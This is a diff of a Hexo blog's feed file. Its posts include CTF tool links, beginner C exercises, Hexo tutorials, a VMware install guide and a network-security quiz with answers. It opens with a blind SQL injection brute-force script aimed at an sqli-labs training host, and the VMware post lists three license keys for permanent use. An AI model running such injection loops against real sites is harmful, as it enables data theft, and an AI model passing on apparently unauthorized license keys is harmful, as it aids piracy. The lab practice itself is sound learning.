-<p>#payload: and substr(database(),1,1)=’s’<br>for i in range(1,10):<br>    for char in dic:<br>        url=”<a href="http://3b6b3138-84d3-47b5-9bc2-a1bc41bc69b4.node4.buuoj.cn/Less-8/?id=1&#39;&quot;">http://3b6b3138-84d3-47b5-9bc2-a1bc41bc69b4.node4.buuoj.cn/Less-8/?id=1&#39;&quot;</a><br>        payload=” and substr(database(),{},1)=’{}’–+”.format(i,char)<br>        url = url + payload<br>        print(url)<br>        r=requests.get(url)<br>        time.sleep(0.00001)<br>        #print(r.text)<br>        if “are” in r.text:<br>            flag+=char<br>            print(flag)<br>print(flag)</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>逆向工具下载链接</title>
+      <link href="/2021/10/07/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5/"/>
+      <url>/2021/10/07/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5/</url>
+      
+        <content type="html"><![CDATA[<p><strong>IDEA编译工具</strong>：<a href="https://www.jetbrains.com/zh-cn/idea/download/#section=windows">https://www.jetbrains.com/zh-cn/idea/download/#section=windows</a></p><p><strong>DIE 查壳工具</strong>：<a href="https://www.lanzoui.com/iY94aioy7ad">https://www.lanzoui.com/iY94aioy7ad</a></p><p><strong>IDA反汇编</strong>：<a href="https://tool.pediy.com/index-detail-6.htm">https://tool.pediy.com/index-detail-6.htm</a></p>]]></content>
+      
+      
       <categories>
-        <category>Web</category>
+          
+          <category> 逆向 </category>
+          
       </categories>
-      <tags>
-        <tag>sql</tag>
-        <tag>代码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解密码网站</title>
-    <url>/2021/10/03/%E8%A7%A3%E5%AF%86%E7%A0%81%E7%BD%91%E7%AB%99/</url>
-    <content><![CDATA[<p><strong>Base64</strong>：<a href="https://tool.ip138.com/base64/">https://tool.ip138.com/base64/</a></p>
-<p><strong>凯撒密码</strong>：<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p>
-<p><strong>摩斯密码</strong>：<br><a href="http://www.all-tool.cn/Tools/morse/?&amp;rand=cb7c231dd721fec36c8f7afdf6d3b5da">http://www.all-tool.cn/Tools/morse/?&amp;rand=cb7c231dd721fec36c8f7afdf6d3b5da</a></p>
-<p><strong>ASCII解码，转进制</strong>：<a href="http://www.ab126.com/goju/1711.html">http://www.ab126.com/goju/1711.html</a></p>
-<p><strong>01248云影密码</strong>：<br><a href="https://lilongsy.blog.csdn.net/article/details/108483119?utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-3.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-3.no_search_link">https://lilongsy.blog.csdn.net/article/details/108483119?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-3.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-3.no_search_link</a></p>
-<p><strong>栅栏密码</strong>：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>
-<p><strong>培根密码</strong>：<a href="https://wtool.com.cn/baconian.html">https://wtool.com.cn/baconian.html</a></p>
-<p><strong>RSA密钥</strong>：<a href="https://www.bejson.com/enc/rsa/">https://www.bejson.com/enc/rsa/</a></p>
-<p><strong>应付CTF里RAS的工具</strong>：<a href="https://github.com/3summer/CTF-RSA-tool">https://github.com/3summer/CTF-RSA-tool</a></p>
-<p><strong>pyc反编译</strong>：<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p>
-<p><strong>获取公钥的加密类型、加密长度、其他参数，以及DER格式输出</strong>：<a href="http://www.hiencode.com/pub_asys.html">http://www.hiencode.com/pub_asys.html</a></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>解密码网站</title>
+      <link href="/2021/10/03/%E8%A7%A3%E5%AF%86%E7%A0%81%E7%BD%91%E7%AB%99/"/>
+      <url>/2021/10/03/%E8%A7%A3%E5%AF%86%E7%A0%81%E7%BD%91%E7%AB%99/</url>
+      
+        <content type="html"><![CDATA[<p><strong>Base64</strong>：<a href="https://tool.ip138.com/base64/">https://tool.ip138.com/base64/</a></p><p><strong>凯撒密码</strong>：<a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p><p><strong>摩斯密码</strong>：<br><a href="http://www.all-tool.cn/Tools/morse/?&amp;rand=cb7c231dd721fec36c8f7afdf6d3b5da">http://www.all-tool.cn/Tools/morse/?&amp;rand=cb7c231dd721fec36c8f7afdf6d3b5da</a></p><p><strong>ASCII解码，转进制</strong>：<a href="http://www.ab126.com/goju/1711.html">http://www.ab126.com/goju/1711.html</a></p><p><strong>01248云影密码</strong>：<br><a href="https://lilongsy.blog.csdn.net/article/details/108483119?utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-3.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-3.no_search_link">https://lilongsy.blog.csdn.net/article/details/108483119?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-3.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-3.no_search_link</a></p><p><strong>栅栏密码</strong>：<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p><p><strong>培根密码</strong>：<a href="https://wtool.com.cn/baconian.html">https://wtool.com.cn/baconian.html</a></p><p><strong>RSA密钥</strong>：<a href="https://www.bejson.com/enc/rsa/">https://www.bejson.com/enc/rsa/</a></p><p><strong>应付CTF里RAS的工具</strong>：<a href="https://github.com/3summer/CTF-RSA-tool">https://github.com/3summer/CTF-RSA-tool</a></p><p><strong>pyc反编译</strong>：<a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p><p><strong>获取公钥的加密类型、加密长度、其他参数，以及DER格式输出</strong>：<a href="http://www.hiencode.com/pub_asys.html">http://www.hiencode.com/pub_asys.html</a></p>]]></content>
+      
+      
       <categories>
-        <category>密码</category>
+          
+          <category> 密码 </category>
+          
       </categories>
-      <tags>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>统计高于平均的人数</title>
-    <url>/2021/12/22/%E7%BB%9F%E8%AE%A1%E9%AB%98%E4%BA%8E%E5%B9%B3%E5%9D%87%E7%9A%84%E4%BA%BA%E6%95%B0/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">float arrayAvg(int a[],int n)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	float sum=0,avg;</span><br><span class="line">	for(i=0;i&lt;n;i++)</span><br><span class="line">		sum+=a[i];</span><br><span class="line">	avg=sum/(float)n;</span><br><span class="line">return avg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">int i,n,num=0;</span><br><span class="line">float avg;</span><br><span class="line">float arrayAvg(int a[],int n);</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">int a[n];</span><br><span class="line">	for(i=0;i&lt;n;i++)</span><br><span class="line">		scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">avg=arrayAvg(a,n);</span><br><span class="line">	for(i=0;i&lt;n;i++)</span><br><span class="line">		if(a[i]&gt;avg)</span><br><span class="line">			num++;</span><br><span class="line">	printf(&quot;%d&quot;,num);</span><br><span class="line">return 0;		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>去除Next主题博客点击阅读全文后的#more标签</title>
+      <link href="/2021/09/27/%E5%8E%BB%E9%99%A4%E5%8D%9A%E5%AE%A2%E7%82%B9%E5%87%BB%E9%98%85%E8%AF%BB%E5%85%A8%E6%96%87%E5%90%8E%E7%9A%84more%E6%A0%87%E7%AD%BE/"/>
+      <url>/2021/09/27/%E5%8E%BB%E9%99%A4%E5%8D%9A%E5%AE%A2%E7%82%B9%E5%87%BB%E9%98%85%E8%AF%BB%E5%85%A8%E6%96%87%E5%90%8E%E7%9A%84more%E6%A0%87%E7%AD%BE/</url>
+      
+        <content type="html"><![CDATA[<p>点击Next主题的产生的 <strong>阅读全文</strong> 按钮后，进入的文章会打上 <strong>#more标签</strong><br>这对在博客中使用评论区很不友好，某些评论区因为这样，一篇文章有两个页面，评论区也会分为两部分<br><img src="https://s3.bmp.ovh/imgs/2021/09/65cd356d966d90bf.png" alt="more标签"><br>我们只需要打开 <strong>\theme\next\layout\ _macro\post.njk</strong>(记事本打开就行)</p><p>找到代码 <code>a class=&quot;btn&quot; href=&quot;&#123;&#123; url_for(post.path) &#125;&#125;#more&quot; rel=&quot;contents&quot;</code></p><p>把代码中的#more删掉就行了</p>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> Hexo </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>逆向工具下载链接</title>
-    <url>/2021/10/07/%E9%80%86%E5%90%91%E5%B7%A5%E5%85%B7%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5/</url>
-    <content><![CDATA[<p><strong>IDEA编译工具</strong>：<a href="https://www.jetbrains.com/zh-cn/idea/download/#section=windows">https://www.jetbrains.com/zh-cn/idea/download/#section=windows</a></p>
-<p><strong>DIE 查壳工具</strong>：<a href="https://www.lanzoui.com/iY94aioy7ad">https://www.lanzoui.com/iY94aioy7ad</a></p>
-<p><strong>IDA反汇编</strong>：<a href="https://tool.pediy.com/index-detail-6.htm">https://tool.pediy.com/index-detail-6.htm</a></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+            <tag> Next主题 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>安装VMware虚拟机</title>
+      <link href="/2021/09/26/%E5%AE%89%E8%A3%85VMware%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
+      <url>/2021/09/26/%E5%AE%89%E8%A3%85VMware%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1-下载VMware-Workstation-16-Pro-虚拟机软件"><a href="#1-下载VMware-Workstation-16-Pro-虚拟机软件" class="headerlink" title="1.下载VMware Workstation 16 Pro 虚拟机软件"></a>1.下载VMware Workstation 16 Pro 虚拟机软件</h1><p><strong>官网下载：</strong><br><u><a href="https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html">https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html</a></u></p><span id="more"></span><hr><h1 id="2-下载系统文件，例如Linux系统、Windows系统"><a href="#2-下载系统文件，例如Linux系统、Windows系统" class="headerlink" title="2.下载系统文件，例如Linux系统、Windows系统"></a>2.下载系统文件，例如Linux系统、Windows系统</h1><p>Linux有很多版本，这里提供常见的一种: <strong><u><a href="https://cn.ubuntu.com/download/desktop">Ubuntu</a></u></strong> <strong>⬅点击进入</strong><br>Windows也是官网下载</p><hr><h1 id="3-安装刚刚下载的VMware-Workstation-16-Pro"><a href="#3-安装刚刚下载的VMware-Workstation-16-Pro" class="headerlink" title="3.安装刚刚下载的VMware Workstation 16 Pro"></a>3.安装刚刚下载的VMware Workstation 16 Pro</h1><p>打开软件<br>输入许可证以永久使用，网上有，这里给三个：<br>ZF3R0-FHED2-M80TY-8QYGC-NPKYF<br>YF390-0HF8P-M81RQ-2DXQE-M2UT6<br>ZF71R-DMX85-08DQY-8YMNC-PPHV8</p><hr><h1 id="4-创建新的虚拟机"><a href="#4-创建新的虚拟机" class="headerlink" title="4.创建新的虚拟机"></a>4.创建新的虚拟机</h1><h5 id="1-在VMware-Workstation中点击创建新的虚拟机"><a href="#1-在VMware-Workstation中点击创建新的虚拟机" class="headerlink" title="1.在VMware Workstation中点击创建新的虚拟机"></a>1.在VMware Workstation中点击创建新的虚拟机</h5><h5 id="2-选择-安装程序光盘映像文件-iso-M-这个选项，点击浏览，找到刚刚下载的Ubuntu系统文件—-gt-打开，点下一步"><a href="#2-选择-安装程序光盘映像文件-iso-M-这个选项，点击浏览，找到刚刚下载的Ubuntu系统文件—-gt-打开，点下一步" class="headerlink" title="2.选择 安装程序光盘映像文件(iso)(M) 这个选项，点击浏览，找到刚刚下载的Ubuntu系统文件—&gt;打开，点下一步"></a>2.选择 安装程序光盘映像文件(iso)(M) 这个选项，点击浏览，找到刚刚下载的Ubuntu系统文件—&gt;打开，点下一步</h5><h5 id="3-设置个性化Linux，随便"><a href="#3-设置个性化Linux，随便" class="headerlink" title="3.设置个性化Linux，随便"></a>3.设置个性化Linux，随便</h5><h5 id="4-自定义硬件-从本机扣出来给虚拟机用-：内存6g-低于本机内存就行-，处理器数量选1（个人电脑一般只有一颗Cpu），每个处理器内核数量选6（线程数，可以打开任务管理器-gt-性能-gt-cpu-gt-在右边右键-gt-将图形更改为逻辑处理器，查看自己有几个线程）"><a href="#4-自定义硬件-从本机扣出来给虚拟机用-：内存6g-低于本机内存就行-，处理器数量选1（个人电脑一般只有一颗Cpu），每个处理器内核数量选6（线程数，可以打开任务管理器-gt-性能-gt-cpu-gt-在右边右键-gt-将图形更改为逻辑处理器，查看自己有几个线程）" class="headerlink" title="4.自定义硬件(从本机扣出来给虚拟机用)：内存6g(低于本机内存就行)，处理器数量选1（个人电脑一般只有一颗Cpu），每个处理器内核数量选6（线程数，可以打开任务管理器&gt;性能&gt;cpu&gt;在右边右键&gt;将图形更改为逻辑处理器，查看自己有几个线程）"></a>4.自定义硬件(从本机扣出来给虚拟机用)：内存6g(低于本机内存就行)，处理器数量选1（个人电脑一般只有一颗Cpu），每个处理器内核数量选6（线程数，可以打开任务管理器&gt;性能&gt;cpu&gt;在右边右键&gt;将图形更改为逻辑处理器，查看自己有几个线程）</h5><h5 id="5-打开虚拟机，如果蓝屏就是系统冲突，上网搜搜解决办法"><a href="#5-打开虚拟机，如果蓝屏就是系统冲突，上网搜搜解决办法" class="headerlink" title="5.打开虚拟机，如果蓝屏就是系统冲突，上网搜搜解决办法"></a>5.打开虚拟机，如果蓝屏就是系统冲突，上网搜搜解决办法</h5><h5 id="6-改成中文，图文讲解：https-jingyan-baidu-com-article-3aed632ec1d120701180916b-html"><a href="#6-改成中文，图文讲解：https-jingyan-baidu-com-article-3aed632ec1d120701180916b-html" class="headerlink" title="6.改成中文，图文讲解：https://jingyan.baidu.com/article/3aed632ec1d120701180916b.html"></a>6.改成中文，图文讲解：<u><a href="https://jingyan.baidu.com/article/3aed632ec1d120701180916b.html">https://jingyan.baidu.com/article/3aed632ec1d120701180916b.html</a></u></h5>]]></content>
+      
+      
       <categories>
-        <category>逆向</category>
+          
+          <category> 虚拟机 </category>
+          
       </categories>
-      <tags>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>输入三位数倒序输出</title>
-    <url>/2021/12/29/%E8%BE%93%E5%85%A5%E4%B8%89%E4%BD%8D%E6%95%B0%E5%80%92%E5%BA%8F%E8%BE%93%E5%87%BA/</url>
-    <content><![CDATA[<pre><code>#include &lt;stdio.h&gt;
-int main()
-&#123;
-    int a,b,c;
-    scanf(&quot;%1d%1d%1d&quot;,&amp;a,&amp;b,&amp;c);
-    printf(&quot;%d%d%d&quot;,c,b,a);
-return 0;
-&#125;
-</code></pre>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> diary </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>在Hexo博客中添加桌宠（live2D）</title>
+      <link href="/2021/09/23/%E5%9C%A8Hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E6%A1%8C%E5%AE%A0%EF%BC%88live2D%EF%BC%89/"/>
+      <url>/2021/09/23/%E5%9C%A8Hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E6%A1%8C%E5%AE%A0%EF%BC%88live2D%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h1 id="1-安装插件"><a href="#1-安装插件" class="headerlink" title="1.安装插件"></a>1.安装插件</h1><p>在博客根目录右键，点击Git Bash Here，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><span id="more"></span><p>下载完成能在博客根目录下的 node_moduels 文件夹 中找到 live2d-widget文件夹</p><hr><h1 id="2-下载live2d文件（自己找······）"><a href="#2-下载live2d文件（自己找······）" class="headerlink" title="2.下载live2d文件（自己找······）"></a>2.下载live2d文件（自己找······）</h1><p>下载好之后将所有动画模板拷贝到博客的 node_modules 文件夹里</p><hr><h1 id="3-配置博客根目录下的-config-yml文件（记事本打开就行）"><a href="#3-配置博客根目录下的-config-yml文件（记事本打开就行）" class="headerlink" title="3.配置博客根目录下的_config.yml文件（记事本打开就行）"></a>3.配置博客根目录下的_config.yml文件（记事本打开就行）</h1><p>打开文件，在最后添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-你文件的名字  #模板目录，在node_modules里</span><br><span class="line">  display:</span><br><span class="line">    position: right）</span><br><span class="line">    width: 150</span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: false  #是否在手机进行显示（要开启就改为true）</span><br></pre></td></tr></table></figure><hr><h1 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h1><p>依次输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>看看本地网站<a href="http://localhost:4000/">http://localhost:4000/</a> 有无显示</p><hr><h1 id="5-部署到github"><a href="#5-部署到github" class="headerlink" title="5.部署到github"></a>5.部署到github</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> Live2D </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>随机某月有多少天</title>
-    <url>/2021/11/03/%E9%9A%8F%E6%9C%BA%E6%9F%90%E6%9C%88%E6%9C%89%E5%A4%9A%E5%B0%91%E5%A4%A9/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;int y,m,d;</span><br><span class="line">	printf(&quot;分别输入年和月:&quot;);</span><br><span class="line">	scanf(&quot;%d%d&quot;,&amp;y,&amp;m);</span><br><span class="line">	switch(m)&#123;</span><br><span class="line">	    case 1: </span><br><span class="line">        case 3: </span><br><span class="line">        case 5: </span><br><span class="line">        case 7: </span><br><span class="line">        case 8: </span><br><span class="line">        case 10: </span><br><span class="line">        case 12:</span><br><span class="line">            d=31;break;</span><br><span class="line">        case 4:</span><br><span class="line">        case 6:</span><br><span class="line">        case 9:</span><br><span class="line">        case 11:</span><br><span class="line">            d=30;break;</span><br><span class="line">        case 2:</span><br><span class="line">        	d=28;if (y%4==0 &amp; y%100!=0 || y%400==0)</span><br><span class="line">                     d=29;break;</span><br><span class="line">        default:printf(&quot;输入错误，结果为0天！&quot;) ;</span><br><span class="line">	&#125; </span><br><span class="line">    printf(&quot;%d年%d月有%d天&quot;,y,m,d);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>初入攻防世界</title>
+      <link href="/2021/09/20/%E5%88%9D%E5%85%A5%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
+      <url>/2021/09/20/%E5%88%9D%E5%85%A5%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://songkaiai.github.io/2021/09/20/%E5%88%9D%E5%85%A5%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/image.jpg" alt="初入攻防世界"><br>今天在攻防世界做了几题，慢慢摸索学习中</p>]]></content>
+      
+      
       <categories>
-        <category>C语言</category>
+          
+          <category> Diary </category>
+          
       </categories>
-      <tags>
-        <tag>diary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>黑盾杯预赛结果</title>
-    <url>/2021/12/01/%E9%BB%91%E7%9B%BE%E6%9D%AF100%E9%A2%98%E7%BB%93%E6%9E%9C/</url>
-    <content><![CDATA[<p>压线</p>
-<p>感觉结束了</p>
-<span id="more"></span>
-<p>1．网络安全的基础属性是（  ）</p>
-<p>A. 机密性     B. 可用性      C. 完整性     D. 以上3项都是</p>
-<p>2．橘皮书定义了4个安全层次，从D层（最低保护层）到A层（验证性保护层），其中D级的安全保护是最低的，属于D级的系统是不安全的，以下操作系统中属于D级安全的是（  ）</p>
-<p>A. 运行非UNIX的Macin tosh机         B. 运行Linnx的PC机</p>
-<p>C. UNIX系统                          D. XENIX</p>
-<p>3．网络安全最终是一个折衷的方案，即安全强度和安全操作代价的折衷除增加安全设施投资外，还应考虑（  ）</p>
-<p>A. 用户的方便性                              B. 管理的复杂性</p>
-<p>C. 对现有系统的影响及对不同平台的支持        D. 上面3项都是</p>
-<p>4．下列对访问控制影响不大的是（  ）</p>
-<p>A. 主体身份     B. 客体身份      C. 访问类型     D. 主体与客体的类型</p>
-<p>5．在开放系统互连环境中，两个N层实体进行通信，它们可能用到的服务是（）</p>
-<p>A. N-1层是提供的服务                 B. N层是提供的服务</p>
-<p>C. N+1层是提供的服务                 D. 以上3项都不是</p>
-<p>6．路由控制机制用以防范（  ）</p>
-<p>A. 路由器被攻击者破坏                        B. 非法用户利用欺骗性的路由协议</p>
-<p>C. 在网络层次进行分析；防止非法信息通过路由  D. 以上3项都不是</p>
-<p>7．IpSee协议中负责对IP数据报加密的部分是（  ）</p>
-<p>A. 封装安全负载（ESP）              B. 鉴别包头（AH）</p>
-<p>C. Internet密钥交换（IKE）            D. 以上都不是</p>
-<p>8．GRE协议（  ）</p>
-<p>A. 既封装、又加密                 B. 只封装、不加密   </p>
-<p>C. 不封装、只加密                 D. 不封装、不加密</p>
-<p>9．数据保密性安全服务的基础是（  ）</p>
-<p>A. 数据完整性机制    B. 数字签名机制     C. 访问控制机制    D. 加密机制</p>
-<p>10．包过滤的局限性不包括（  ）</p>
-<p>A. 不能进行内容控制                B. 过滤规则制定比较复杂</p>
-<p>C. 访问控制机制                    D. 不支持实现NAT</p>
-<p>答案：1.D 2.A 3.D 4.D 5.A 6.B 7.A 8.B 9.D 10.D</p>
-<p>1．密码学的目的是（  ）</p>
-<p>A. 研究数据加密    B. 研究数据解密    C. 研究数据保密     D. 研究信息安全</p>
-<p>2．从安全属性对各种网络攻击进行分类。阻断攻击是针对（  ）</p>
-<p>A. 机密性的攻击    B. 可用性的攻击     C. 完整性的攻击     D. 真实性的攻击</p>
-<p>3．Kerberos的设计目标不包括（  ）</p>
-<p>A. 认证       B. 授权       C. 记账       D. 加密</p>
-<p>4．ISO7408-2从体系结构的观点描述了5种可选的安全服务，以下不属于这5种安全服务的是（  ）</p>
-<p>A. 身份鉴别      B. 数据包过滤      C. 授权控制       D. 数据完整性</p>
-<p>5．CA属于ISO安全体系结构中定义的（  ）</p>
-<p>A. 认证交换机制     B. 通信业务填充机制     C. 路由控制机制     D. 公证机制</p>
-<p>6．分组过滤型防火墙原理上是基于（  ）</p>
-<p>  A. 物理层分析的技术           B. 数据链路层分析的技术</p>
-<p>C. 网络层分析的技术           D. 应用层分析的技术</p>
-<p>7．属于第二层的VPN隧道协议有（  ）</p>
-<p>  A. IPSec       B. PPIP       C. GRE      D. 以上皆不是</p>
-<p>8．GRE协议的乘客协议是（  ）</p>
-<p>  A. IP          B. IPX       C. AppleTalk      D. 上述皆可</p>
-<p>9．误用检测的优点不包括（  ）</p>
-<p>  A. 检测准确度高                 B. 能够检测出新的网络攻击 </p>
-<p>C. 便于系统维护                 D. 技术相对成熟</p>
-<p>10．对非军事区DMZ而言，正确的解释是(  )</p>
-<p>   A. DMZ是一个非真正可信的网络部分 </p>
-<p>B. DMZ网络访问控制策略决定允许或禁止进入DMZ通信 </p>
-<p>C. 允许外部用户访问DMZ系统上合适的服务  </p>
-<p>D. 以上3项都是</p>
-<p>答案： 1．C   2. B   3. B   4. B   5. D  6. C   7. B   8. D   9. B   10. D</p>
-<p>1．一般而言，Internet防火墙建立在一个网络在（  ）</p>
-<p>A. 内部子网之间传送信息的中枢           B. 每个子网的内部</p>
-<p>C. 内部网络与外部网络的交叉点          D. 部分内部网络与外部内部的接合处</p>
-<p>2．从安全属性对各种网络攻击进行分类，截获攻击是针对（  ）</p>
-<p>A. 机密性的攻击    B. 可用性的攻击     C. 完整性的攻击    D. 真实性的攻击</p>
-<p>3．数字签名要预先使用单向Hash函数进行处理的原因是（  ）</p>
-<p>A. 多一道加密工序使密文更难破译       </p>
-<p> B. 提高密文的计算速度</p>
-<p>C. 缩小签名密文的长度，加快数字签名的验证签名的运算速度</p>
-<p>D. 保证密文能正确的还原成明文</p>
-<p>4．一个报文的端到端传递内OSZ模型的（  ）</p>
-<p>A. 网络层负责处理                  B. 传输层负责处理</p>
-<p>C. 会话层负责处理                  D. 表示层负责处理</p>
-<p>5．ISU7498-2描述了8种特定的安全机制，这8种特定的安全机制是为5种特定的安全服务设置的，以下不属于这8种安全机制的是（  ）</p>
-<p>A. 安全标记机制     B. 加密机制     C. 数字签名机制     D. 访问控制机制</p>
-<p>6．用于实现身份鉴别的安全机制是（  ）</p>
-<p>A. 加密机制的数字签名机制               B. 加密机制的访问控制机制</p>
-<p>C. 数字签名机制和路由控制机制           D. 访问控制机制的路由控制机制</p>
-<p>7．SSL产生会话密钥的方式是（  ）</p>
-<p>A. 从密钥管理数据库中请求获得           B. 每一台客户机分配一个密钥的方式</p>
-<p>C. 随机由客户机产生并加密后通知服务器   D. 由服务器产生并分配给客户机</p>
-<p>8．PPTP客户端使用（  ）</p>
-<p>A. TCP协议建立连接                  B. UDP协议建立连接     </p>
-<p>C. L2TP协议建立连接                 D. 以上皆不是</p>
-<p>9．拒绝服务攻击的后果是（  ）</p>
-<p>A. 信息不可用     B. 应用程序不可用     C. 阻止通信     D. 上面几项都是</p>
-<p>10．现在防火墙呢中，最常用的技术是（  ）</p>
-<p>A. 代理服务器技术                 B. 状态检测包过滤技术     </p>
-<p>C. 应用网关技术                   D. NAT技术</p>
-<p>答案：1.C 2.A 3.C 4.B 5.A 6.A 7.C 8.A 9.D 10.B</p>
-<p>1．计算机病毒程序隐藏在计算机系统的（  ）</p>
-<p>A. 内存中      B. 软盘中       C. 存储介质中      D. 网络中</p>
-<p>2．可信计算机系统评估准则（Trusted  Computer  System   Evaluation  Criteria  TCSEC）共分为4大类（  ）</p>
-<p>A. 7级       B.8级         C.5级         D.6级</p>
-<p>3．对目标的攻击威胁通常通过代理实现，而代理需要的特性包括（  ）</p>
-<p>A. 访问目标的能力                B. 对目标发出威胁的动机</p>
-<p>C. 有关目标的知识                D. 上面3项都是</p>
-<p>4．从安全属性对各种网络攻击进行分类，截获攻击是针对（  ）</p>
-<p>A. 机密性的攻击     B. 攻击性的攻击     C. 完整性的攻击     D. 真实性的攻击</p>
-<p>5．身份鉴别是安全服务中心的重要一环，以下关于身份鉴别的叙述不正确的是（  ）</p>
-<p>A. 身份鉴别是授权控制的基础               </p>
-<p>B. 身份鉴别一般不用提供双向的认证</p>
-<p>C. 目前一般采用基于对称密钥加密或公开密钥加密的方法</p>
-<p>D. 数字签名机制是实现身份鉴别的重要机制</p>
-<p>6．Web中使用的安全协议有（  ）</p>
-<p>A. PEM   SSL                    B. S-HTTP   S/MIME    </p>
-<p>C. SSL    S-HTTP                D. S/MIME   SSL</p>
-<p>7．ISO定义的安全体系结构中包含（  ）</p>
-<p>A. 4种安全服务     B. 5种安全服务     C. 6种安全服务      D. 7种安全服务</p>
-<p>8．传输层保护的网络采用的主要技术是建议在（  ）</p>
-<p>A. 可靠的传输服务基础上的安全套接字层SSL协议</p>
-<p>B. 不可靠的传输服务基础上的S-HTTP协议</p>
-<p>C. 可靠的传输服务基础上的S-HTTP协议</p>
-<p>D. 不可靠的传输服务基础上的安全套接字层SSL协议</p>
